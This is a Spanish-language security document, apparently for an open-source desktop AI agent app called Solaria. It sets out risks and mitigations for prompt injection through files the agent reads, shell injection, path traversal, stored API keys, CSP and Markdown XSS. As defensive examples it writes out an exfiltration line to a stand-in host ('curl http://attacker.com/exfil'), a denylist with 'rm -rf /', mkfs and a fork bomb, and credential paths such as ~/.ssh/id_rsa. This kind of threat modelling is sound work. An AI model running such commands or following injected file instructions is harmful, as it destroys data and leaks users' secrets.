# Seguridad

## Visión general

Solaria ejecuta código local en tu máquina y se conecta a servicios externos (APIs de IA) bajo tu control. Este documento describe los riesgos identificados y las medidas implementadas.

---

## Riesgos identificados

### 1. Inyección de prompts (Prompt Injection)

**Riesgo:** Un usuario malintencionado podría engañar al modelo para que ejecute comandos peligrosos mediante instrucciones camufladas en el contenido que el agente procesa (ej: al leer un archivo `README.md` que contiene un prompt injection).

**Medidas:**

- El system prompt del agente instruye explícitamente al modelo a **nunca ignorar las reglas de seguridad**
- Las herramientas permitidas se configuran manualmente en Settings > Agente
- El usuario define el directorio de trabajo, limitando el alcance del agente
- El usuario puede desactivar herramientas individuales (`write_file` es la más riesgosa)

**Recomendación:** Implementar un filtro de "comandos peligrosos" en el backend (bloquear `rm -rf /`, `sudo`, `chmod 777`, etc.) y mostrar confirmación antes de ejecutar comandos de escritura/eliminación.

---

### 2. Ejecución de comandos shell (Shell Injection)

**Riesgo:** La herramienta `shell` ejecuta comandos con `sh -c`. Si el modelo construye un comando con entrada no sanitizada del usuario, podría ocurrir inyección.

**Ejemplo de ataque:** El usuario escribe *"dime el contenido de /etc/passwd"* y el modelo construye `cat /etc/passwd; curl http://attacker.com/exfil`

**Medidas:**

- El comando se pasa como string plano a `sh -c`, sin interpolación adicional
- El modelo solo ejecuta lo que él mismo genera (no hay concatenación directa de input de usuario)
- El usuario ve cada comando antes de ejecutarse en el panel AgentAside

**Recomendación:** Implementar un allowlist de comandos base (`ls`, `cat`, `find`, `git`, `npm`, `cargo`, etc.) o denylist de operaciones peligrosas (`rm -rf`, `> /dev`, `dd`, `mkfs`, `:(){ :|:& };:`).

---

### 3. Acceso a archivos (Path Traversal)

**Riesgo:** `read_file` y `write_file` aceptan rutas absolutas. Un ataque podría leer archivos sensibles del sistema (`/etc/shadow`, `~/.ssh/id_rsa`).

**Medidas:**

- El usuario configura el directorio de trabajo en Settings > Agente
- El modelo recibe el directorio de trabajo en el system prompt
- Los resultados se muestran en el panel AgentAside para supervisión

**Recomendación:** Implementar verificación de que las rutas accedidas están dentro del directorio de trabajo configurado (o un conjunto de directorios permitidos).

---

### 4. API keys en localStorage

**Riesgo:** Las API keys ingresadas en Settings se almacenan en `localStorage` del navegador/webview en texto plano.

**Medidas:**

- El webview de Tauri no comparte localStorage con navegadores externos
- El acceso físico a la máquina es necesario para extraer las keys
- Las keys se envían exclusivamente al proveedor que el usuario configuró

**Recomendación a futuro:** Migrar a almacenamiento cifrado via Rust backend (keyring del sistema operativo o archivo cifrado con contraseña maestra).

---

### 5. Content Security Policy (CSP)

**Estado actual:** Implementado.

```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
img-src 'self' data:; connect-src 'self' http://localhost:* https:;
font-src 'self'; frame-src 'none'; object-src 'none'
```

- `script-src 'self'` — solo scripts propios, sin inline ni eval
- `connect-src` permite conexiones a localhost (Ollama) y cualquier HTTPS (APIs cloud)
- `frame-src 'none'` y `object-src 'none'` — previenen clickjacking y plugins
- `style-src 'unsafe-inline'` — necesario para Tailwind CSS (inline styles)
- `img-src 'self' data:` — permite imágenes empaquetadas y data URIs (para iconos)

---

### 6. XSS via Markdown

**Riesgo:** El renderizador Markdown usa `dangerouslySetInnerHTML`. Sin sanitización adecuada, un ataque podría inyectar scripts maliciosos en las respuestas del modelo.

**Estado actual:**
- Todo el texto se escapa con `escapeHtml()` antes del renderizado
- Las URLs de links se sanitizan con `sanitizeUrl()` (solo permite `http://`, `https://`, `mailto:`, `#`)
- Los bloques de código se renderizan con HTML escapado
- Atributos `target="_blank"` y `rel="noopener noreferrer"` en todos los links externos

---

### 7. CSP vía Tauri (Security.conf)

**Recomendación adicional:** Habilitar `devUrl` y `build` con scripts de verificación de integridad. Considerar usar el aislador de Tauri para proteger el frontend del backend.

---

## Resumen de acciones

| Prioridad | Acción | Estado |
|-----------|--------|--------|
| 🔴 Alta | Validar rutas de archivos contra el directorio de trabajo | ✅ Implementado |
| 🔴 Alta | Bloquear comandos shell peligrosos en `tools.rs` | ✅ Implementado |
| 🔴 Alta | Bloquear rutas sensibles del sistema (`/etc/shadow`, `~/.ssh/`, etc.) | ✅ Implementado |
| 🟡 Media | Cifrar API keys en disco (keyring del SO) | ❌ Pendiente |
| 🟡 Media | Agregar confirmación antes de `write_file` | ❌ Pendiente (requiere UI) |
| 🟢 Baja | Sandboxing del agente (contenedores) | ❌ Planeado |
| 🟢 Baja | Rate limiting de herramientas | ❌ Planeado |

---

## Reportar vulnerabilidades

Si encuentras una vulnerabilidad de seguridad, por favor abre un issue en el repositorio de GitHub. No se requiere divulgación responsable formal — este es un proyecto open source en fase temprana.
